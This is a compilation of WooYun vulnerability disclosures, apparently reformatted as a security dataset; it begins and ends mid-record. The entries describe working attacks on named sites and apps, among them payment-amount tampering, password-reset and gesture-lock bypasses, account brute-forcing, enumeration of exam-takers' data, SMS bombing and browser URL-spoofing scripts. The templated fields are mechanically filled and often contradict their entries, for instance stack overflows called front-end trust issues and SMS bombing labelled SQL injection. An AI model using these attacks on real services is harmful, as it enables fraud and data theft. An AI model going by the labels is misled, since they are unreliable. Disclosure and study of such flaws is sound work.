**详情**: 看了学校某个同学提交的漏洞，得到了一台thinkpad，我笔记本也不行了，就来挖洞了。1 老规矩，走正常重置密码的途径。http://**.**.**.**/2输入自己的邮箱3 先看参数uid和token是不是一一对应起来的uid改成17125817失败，好吧，继续走正常流程4  好戏来了，重点在这里这一步，没有对用户的身份进行验证合法性登陆一下 刚才的目标邮箱mask 区域*****.** 密码 w123456 验证^*****然后看这个漏洞，我们能干什么？随便找一个任课老师的邮箱，考前神不知鬼不觉的入侵邮箱搞到期末考试的试卷，是不是躺着也保送清北华五？然后我们去看这个漏洞影响了多少单位？http://**.**.**.**/jyjg/list_32.aspx 请在此页查看。高校 企业 事业 。。。。。。上百家单位。我想问这样的漏洞，厂商给多少奖励和RANK？ 我的thinkpad还有希

**POC**: 看了学校某个同学提交的漏洞，得到了一台thinkpad，我笔记本也不行了，就来挖洞了。1 老规矩，走正常重置密码的途径。http://**.**.**.**/2输入自己的邮箱3 先看参数uid和token是不是一一对应起来的uid改成17125817失败，好吧，继续走正常流程4  好戏来了，重点在这里这一步，没有对用户的身份进行验证合法性登陆一下 刚才的目标邮箱mask 区域*****.** 密码 w123456 验证^*****然后看这个漏洞，我们能干什么？随便找一个任课老师的邮箱，考前神不知鬼不觉的入侵邮箱搞到期末考试的试卷，是不是躺着也保送清北华五？然后我们去看这个漏洞影响了多少单位？h

**绕过**: 直接利用

**修复**: 我只想要一台thinkpad
---

---
### [wooyun-2012-013610] 上海毅网信息技术有限公司某处设计缺陷
**厂商**: 上海毅网信息技术有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华丽丽的发了个低调的漏洞..........任意刷Q币、各种游戏点卡..........Q币要多少有多少有木有！！！！=============================================在进行充值的时候，支付金额与充值金额可被修改，导致可以用1分钱充到999999块钱。参照[支付漏洞的三种常见类型]中，属于第一种情况详见说明.....

**POC**: 1、到这里，选择一项支付方式，然后输入你想要的金额~https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 不直接在数据包中加入需要金额和数量等敏感数值，在数据包中加上随机TOKEN防止数据包内容被篡改(感谢0x334@wooyun提出)支付金额与充值金额的统一！[支付漏洞的三种常见类型]：https://example.com/[已脱敏]
---

---
### [wooyun-2015-0115073] 视觉中国看我1分钱买3万的东西(支付逻辑漏洞)
**厂商**: fotomore.com | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如果去代充值，是不是早晚成富二代他爹！

**POC**: 第一次 测试帐号：blackgame------------------------------详细步骤-----------------------------------------选择那个最贵的东西，然后卧槽，想着我要免费获得 我要免费获得！！！然后进入下一步打开拦截工具，然后选择某电商平台 付款如图修改金额 0.01 这里我简单带过。可以去看@小威WooYun: 安居客账号支付功能存在漏洞（1分钱成功支付证明）的漏洞比我详细

**绕过**: 直接利用

**修复**: 希望厂商可以不回收我的3万下载。。。如果要回收也可以。blackgame 550的Blackboss 30000万
---

---
### [wooyun-2015-0124205] 乐友商城支付功能存在逻辑漏洞
**厂商**: 乐友(中国)超市连锁有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选择东西下单 进入支付页面https://example.com/[已脱敏])&amount=0.1进入某电商平台的页面忘截了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09606] 自行注册用户可绕过柜台受理开通某电商平台与财付通的快捷支付
**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册并登录中国邮政储蓄银行，点击申请开办->网上支付->签约加办，合同点同意。此时，假如没有在柜台开通网上支付业务，卡号是空的，只有一项“请选择”，但是，可以通过IE8或以上的 开发人员工具，对这个下拉选择列表的内容进行编辑，只在<option>中增加属性 value="卡号"，其他按要求填写，这里请注意，手机可以任意填写，所以留下漏洞。填写完毕后点击提交，会要求输入支付密码，请正确输入，再提交，假如出现成功提交提示，即表示已成功操作。

**POC**: 假如需要更详细的账户信息，请直接联系我。

**绕过**: 直接利用

**修复**: 贵方一定比我懂。
---

---
### [wooyun-2014-085797] 360压缩3.2.0.2030栈缓冲区溢出+空指针引用
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 虽然考虑了一层路径长度最大应该是MAX_PATH，但是完全没有考虑到上下两层文件夹的名字加起来那就不一定是这个数字了，所以在360zip+0x7124b 处两个字符串拷贝函数处扑街了，拷贝完以后发生栈缓冲区溢出。还好有Security Cookies罩着。问题在：0:000> gBreakpoint 2 hiteax=03190748 ebx=00000002 ecx=00120000 edx=03190562 esi=00000060 edi=00a64670eip=0047108b esp=001289d4 ebp=03190560 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246360zip+0x7108

**POC**: 0:000> pcteax=001289f0 ebx=00000000 ecx=00000000 edx=00128bf8 esi=00000128 edi=00000000eip=0047127e esp=001289b4 ebp=0222029e iopl=0         nv up ei pl nz na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206360zip+0x7127e:0047127e ff1590a14e00    call    dword ptr [

**绕过**: 直接利用

**修复**: 使用_s拷贝函数或者好好校验要写入缓冲区的数据内容
---

---
### [wooyun-2015-0115947] 某电商平台客户端某漏洞导致可以大规模钓鱼获取某电商平台账号
**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昨晚睡不着，躺床上玩手机的时候研究了一下IOS移动端的伪协议发现某电商平台客户端存在一些问题基础协议是：taobao://由于某电商平台客户端的设计，导致可以在后面加URL打开任意网站但是APP做了正则匹配，对于不在白名单中的URL，会跳出提示例如：taobao://wooyun.org俗话说得好，有正则的地方必有绕过一番尝试，发现确实可以绕过这个限制taobao://**-taobao.com只要是这种格式的域名并且“**”为某个域名后缀就可以，“**”为其他英文字符的则无法绕过限制可以绕过的比如taobao://me-taobao.comtaobao://com-taobao.comtaobao://cn-taobao.com前两个已经有人在用了于是我注册了org-taobao.com=========================================================

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146859] 宾安酒店客房保险柜存在逻辑漏洞可普通权限修改超级管理员密码
**厂商**: 上海宾安实业有限公司 | **年份**: 2015 | **类型**: 权限控制绕过

**元思考**: 触发信号: 功能测试

**洞察**: 权限控制绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别权限控制绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 保险柜操作流程如图，黑客可以访客身份修改超级管理员密码然后在服务生用钥匙重置保险柜后以此打开保险柜，窃取下个房客的财务或机密文件。这种低权限用户可以修改的超级管理员密码我们要他干吗？！说明书上并没有归档这个问题，而且服务生看超级密码是否被修改的概率也不超过50%(有钥匙谁还会去用复杂的密码那？)，故此方法攻击窃取财物机密的成功概率在此款保险柜上大于50%保险柜操作流程黑客（窃贼）作案流程视频http://**.**.**.**/ptv/vplay/23775203.html#0-qzone-1-30480-d020d2d2a4e8d1a374a433f596ad1440钥匙重置密码及超级密码，这里还算合理否则就算拒绝服务了。

**POC**: http://**.**.**.**/ptv/vplay/23775203.html#0-qzone-1-30480-d020d2d2a4e8d1a374a433f596ad1440<video href="http://**.**.**.**/ptv/vplay/23775203.html#0-qzone-1-30480-d020d2d2a4e8d1a374a433f596ad1440.swf"/>

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-058808] IOS版史上最坑爹游戏随意修改金币
**厂商**: 珠海顶峰互动科技有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 打开itools，选取如下图位置然后，修改里面这个文件的属性值然后再看游戏修改过来了

**POC**: 打开itools，选取如下图位置然后，修改里面这个文件的属性值然后再看游戏修改过来了

**绕过**: 直接利用

**修复**: 加密
---

---
### [wooyun-2015-0123300] 桔色成人某处0元支付(支付逻辑漏洞)
**厂商**: 桔色成人 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册，获赠￥16桔币桔币就是突破点订单使用桔币优惠，任意输入个<=16的数字，提交订单，burp修改桔币。此处我输入15，burp将下图匹配到的15改为要优惠的钱，4个都改，我修改为717，然后提交。查看我的订单，订单提交系统成功，数学不大好，优惠多了1块。。。

**POC**: 。。

**绕过**: 直接利用

**修复**: 服务器端验证
---

---
### [wooyun-2015-0160693] 辽宁省民心网设计逻辑缺陷（泄漏人员信息）
**厂商**: 辽宁省民心网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://**.**.**.**/user/login.aspx没做任何限制，利用top500+123456可得用户有些需要手机号验证未能登录，只泄漏一些基本信息 ：）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 登录处做限制密码复杂度加强
---

---
### [wooyun-2014-074908] 某社交平台某分站手机短信轰炸
**厂商**: 某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册的时候会发送验证码进行验证。一般是需要加token进行验证，但这里啥都木有，抓包分析：换个手机来收短信试试结果：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-069081] 游侠网商城支付漏洞
**厂商**: ali213.net | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 订单先不支付。到我的商城里，修改相关订单表单隐藏字段total_num为需要数值，然后付款...

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ... 还我1分钱 \(╯-╰)/
---

---
### [wooyun-2014-070199] 某自治区高考志愿申报网站存在严重安全漏洞(涉及16万+考生信息泄漏，可任意修改考生志愿)
**厂商**: cncert | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是逻辑漏洞：我先用我的帐号登录。http://www1.**.zsks.cn/kscx/可以看到如果你得到了考生号和密码，就可以为所欲为了！修改考生志愿？在报考最后阶段修改考生密码？我是不是太邪恶了？这样别人就没有大学上了！所以说威胁程度比较高。看到那个有我头像的地方，这个可以遍历到所有某省古考生的头像。例如：http://www1.**.zsks.cn/kscx/zy/picture.gif?ksh=考生号其中那个考生号可以用来遍历，这样就可以把全省高考生头像下载下来，这样就可以认真挑选妹纸了，比如，看到那个妹纸漂亮，我们就把考生号记录下来，但是这样只有头像，没有其他信息啊，其实是可以获取其他信息的。那么下面就是如何获取高考生信息了，其实是有2处没有设置验证码，从而导致暴力破解，在考生服务平台暨网上填报志愿这里设置了，为什么在其他处没有设置呢？下面我们来看：2014年某省古普通高校招

**POC**: Burp爆破抓包：POST /query/pz14_ksgj.jsp HTTP/1.1Host: www1.**.zsks.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflat

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-038186] Windows phone 8系统可以猜测密码位数
**厂商**: windowsphone.com | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Windows phone 8系统可以猜测密码位数 在Windows phone 8设定密码后比如密码是4位解锁的时候，你输入四位后就会提示密码错误 同样设置五位密码的时候，输入五位就会提示密码错误，从而可以猜测密码位数，来猜测密码。

**POC**: null

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2013-047408] 某IM软件全版本突破视频聊天免打扰功能
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在某互联网公司里面想找人视频聊天首先要让对方回复你一下，才能视频通话，我就非要直接视频聊天。。。。。。。其实很简单分为三部：1、首先直接实时对讲。2、退出实时对讲功能。3、再直接视频聊天，你就发现可以直接视频聊天了，已经突破了防打扰功能。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这是个很简单的逻辑错误～
---

---
### [wooyun-2015-0102153] 某高考辅助填报志愿系统支付漏洞
**厂商**: 第一高考网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /ajaxpro/Web.buy.order,Web.ashx HTTP/1.1Host: www.diyigaokao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8X-AjaxPro-Method: SetInfoReferer: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 很严重的洞啊，求rank大礼包！
---

---
### [wooyun-2013-036326] 酷房网之某子域一处注射漏洞和短信轰炸漏洞
**厂商**: koofang.com | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注射点：https://example.com/[已脱敏] 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送

**POC**: 注射点：https://example.com/[已脱敏] 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送

**绕过**: 直接利用

**修复**: 程序员会懂得~
---

---
### [wooyun-2012-05126] 直接读取某互联网公司网盘信息（无需独立密码）
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用过某互联网公司网盘的人都知道，如果设置在某互联网公司网盘上设置密码之后，每次启动某互联网公司网盘是需要输入密码才可以进入的。但是，如果用手机登录（因为手机某浏览器一般都设置了自动登录，无需再输入某互联网公司密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你某互联网公司网盘内存放的各种密码、看到各种妹子照片呀等等。。

**POC**: 首先，打开手机某浏览器。然后，向右滑动，进入“云U盘”。此时可以看到“某互联网公司网盘”出现，继续点击进入。无需密码，直接可以看到里面的文件。。

**绕过**: 直接利用

**修复**: 加密码喽~您比我专业。
---

---
### [wooyun-2013-016874] Opera URL欺骗漏洞(二)
**厂商**: Opera | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于opera在实现data uri协议的时候不指定mediatype也是一个合法的data url,导致我们可以在parameters处做url欺骗.

**POC**: <script>function poc(){var w=open('data:;//view.news.某域名.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>

**绕过**: 直接利用

**修复**: 限制data uri parameters的格式
---

---
### [wooyun-2015-0154141] 众用助手某功能设计逻辑缺陷可撞库
**厂商**: 众用助手 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/此登录页面没有验证码来防爆破，密码也是明文传输burp抓包，设置密码为abc123,使用用户名字典爆破账号长度为600+的为正确账号，响应中显示success继续看其他状态的响应发现账号正确密码错误提示WRONG_PASSWROD账号不正确的提示NOT_FOUND长度1352的账号状态为未激活于是发现可以先批量爆破账号，然后save->results-table保存选中的payload就把存在的账号（长度414）批量保存成字典了，然后再用若口令字典进行爆破大大提高效率。我用账号字典跑了8万多条爆出近2千用户名（这里只是爆出用户名）刚到C就2千用户名了然后用爆出的用户名字典跑密码字典，可能我的密码字典太弱跑了6万多才报出俩到此为止，就不再继续跑了

**POC**: 应该说清楚了吧

**绕过**: 直接利用

**修复**: 登录页面加验证码，密码加密传输，响应中的state不要透漏太多信息
---

---
### [wooyun-2015-093556] 中国计算机学会在线支付漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 计算机学会会员用户随意修改form数据，低价充会员费

**POC**: 1.打开https://example.com/[已脱敏]	进入页面，缴费年限选择5年，缴费方式选择“某电商平台”3.进入提交，页面，使用Chrome，打开“开发者工具”，修改金额为任意的数值，比如“1”4.点击“确认支付”，此时跳转到某电商平台收银台，注意右上角的金额就为1元了，此时进行支付，一切顺利。5.我支付了1元，现在可以看一下我的缴费记录。而我的失效日期顺延了5年。也就是我只花了1元，却顺延了5年的会员有效期,此漏洞即为危险，因为涉及到会员开发票的问题。

**绕过**: 直接利用

**修复**: 添加缴费成功以后的校验或者对传入某电商平台的参数进行处理。
---

---
### [wooyun-2015-092578] 某家电厂商商城一处支付漏洞
**厂商**: 某家电厂商商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 添加到购物车没做验证添加购物车时候抓包在去买一件正常商品 添加到购物车 然后结算

**POC**: 多给点ran k吧

**绕过**: 直接利用

**修复**: 验证number参数 非负数
---

---
### [wooyun-2015-0154759] 74cms3.6后台验证码绕过
**厂商**: 74cms.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于没有对验证码刷新，导致可以重复多用看看后台的$captcha=get_cache('captcha');if(empty($postcaptcha) && $captcha['verify_adminlogin']=='1'){header("Location:?act=login&err=".urlencode('验证码不能为空'));exit();}if ($captcha['verify_adminlogin']=='1' && strcasecmp($_SESSION['imageCaptcha_content'],$postcaptcha)!=0){write_log("<span style=\"color:#FF0000\">验证码填写错误</span>",$admin_name,2);header("Location:?act=login&err=".urlencode

**POC**: 由于没有对验证码刷新，导致可以重复多用看看后台的$captcha=get_cache('captcha');if(empty($postcaptcha) && $captcha['verify_adminlogin']=='1'){header("Location:?act=login&err=".urlencode('验证码不能为空'));exit();}if ($captcha['verify_adminlogin']=='1' && strcasecmp($_SESSION['imageCaptcha_content'],$postcaptcha)!=0){write_log("<spa

**绕过**: 直接利用

**修复**: 刷新
---

---
### [wooyun-2013-043556] Sdemo2.0  栈溢出漏洞
**厂商**: sdemo 2.0 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: null修改后的文件 poc文件

**POC**: 图一是当把SEH处理程序指向入口点后，运行后成功弹出来一个主程序。说明利用成功图二是正常情况的堆栈信息图三是溢出后的堆栈信息

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2013-036481] 绕过360杀毒任意加载驱动
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次是安全卫士、这次是杀毒。不算作弊。问题一样的。写个程序枚举注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services，找一个Start值不为4的驱动（最好是第三方驱动），根据路径替换掉驱动文件，重启生效绕过后改个配置文件规则啥的基本就全过了，体力活。

**POC**: 试试就知道

**绕过**: 过滤绕过

**修复**: 他们更懂
---

---
### [wooyun-2015-0165461] 数米基金网主站设计逻辑缺陷令导致多个账号信息暴露
**厂商**: fund123.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: # https://example.com/[已脱敏]

**POC**: #个人信息泄露：#基金信息泄露：

**绕过**: 直接利用

**修复**: # 增强密码校验机制
---

---
### [wooyun-2015-0140164] 天脉网在线订票存在任意金额支付漏洞
**厂商**: 天脉网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 将3000都改为100将3000都改为100得到票了！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-03293] 异地过某互联网公司二代密保三个问题验证
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大家都知道异地登录某互联网公司后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开某互联网公司面板的消息管理器  找到以前的 或者某互联网公司里面的陌生人 （没有联系人 可以加自己的某互联网公司）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧

**POC**: 这里以一个某互联网公司为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：

**绕过**: 直接利用

**修复**: 引用安全中心的问题验证  或者 设置输入次数等 都可以解决这个问题
---

---
### [wooyun-2015-0120120] 真融宝Android客户端手势密码绕过+拒绝服务漏洞
**厂商**: 真融宝 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.手势密码绕过2.拒绝服务

**POC**: 1.手势密码绕过在设置了手势密码的时候，通过启动com.zrb.SplashActivity，可绕过手势密码，查看用户信息dz> run app.activity.start --component com.zrb  com.zrb.SplashActivity2.broadcast拒绝服务app暴露多个组件，其中Receiver: com.umeng.message.BootBroadcastReceiver 会引发程序奔溃退出dz> run app.broadcast.send --component com.zrb  com.umeng.message.BootBroadcastRece

**绕过**: 过滤绕过

**修复**: 修复你们比较懂
---

---
### [wooyun-2015-0157507] 亲宝宝Android客户端任意账户密码重置
**厂商**: https://example.com/[已脱敏] | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在用手机注册的时候，发现验证码是4位的，感觉有被暴力猜解的可能，于是测试一下，结果却发现验证码在发送请求的时候被直接返回了。这样，即使用一个实际不存在的手机号也可以注册，如13512345678。验证码 code:6390被直接返回了输入验证码，进到这里。提示已注册过了，可以登录或者继续注册一个（如果选择这一项，原来的内容就废了，失去了和手机号的关联）。登陆进去发现，这应该是一个测试人员的账号，囧同样的方式，换一个没被注册过的号码试试，可以注册成功。并且找回密码也是一样，可以直接根据返回的code重置密码。实际上，输入验证码后是会再次到服务器验证的。所以在请求时直接返回了验证码应该是个bug，但是影响很大。如图，在对code进行des加密后，会再次到服务器上验证。发送到服务器的数据包会进行自签名(计算值sign)，如果用burp简单的修改手机号码后就进行重发就会报500但是这个算法是可以被

**POC**: 可以随意申请账号，也可以重置任意账号密码。

**绕过**: 直接利用

**修复**: 1. 千万不要在请求手机验证码时直接把验证码通过web返回2. 最好使用6位验证码3. IOS端如果是类似逻辑需要一并修改
---

---
### [wooyun-2014-084515] 某运营商某省套餐购买逻辑漏洞+订单泄露
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 套餐购买地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066355] 搜狗浏览器5.0.9.13085HTTP204伪造网站漏洞
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <form action="https://example.com/[已脱敏]" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>

**绕过**: 直接利用

**修复**: http204没有响应内容 内容修改时地址应该改为about:blank
---

---
### [wooyun-2013-040837] 某电商平台短信验证码短信轰炸
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

